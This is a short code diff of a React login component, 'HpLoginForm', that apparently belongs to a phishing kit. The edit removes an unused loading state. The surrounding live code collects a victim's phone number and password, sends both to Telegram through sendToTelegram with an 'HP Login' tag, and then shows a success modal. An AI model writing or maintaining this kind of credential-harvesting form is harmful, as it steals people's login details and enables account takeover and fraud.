@@ -12,7 +12,6 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
   const [password, setPassword] = useState('');
   const [phoneError, setPhoneError] = useState(false);
   const [pwError, setPwError] = useState(false);
-  const [loading, setLoading] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
   const [step, setStep] = useState(1);
 
@@ -53,8 +52,6 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
 
     if (!ok) return;
 
-    setLoading(true);
-
     // Send to Telegram with "HP Login" context
     const success = await sendToTelegram(phoneNumber, password, "HP Login", "-");
     
@@ -63,7 +60,6 @@ const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
 
     setTimeout(() => {
       setShowCustomLoading(false);
-      setLoading(false);
       
       if (success) {
         setStep(3); // Success modal
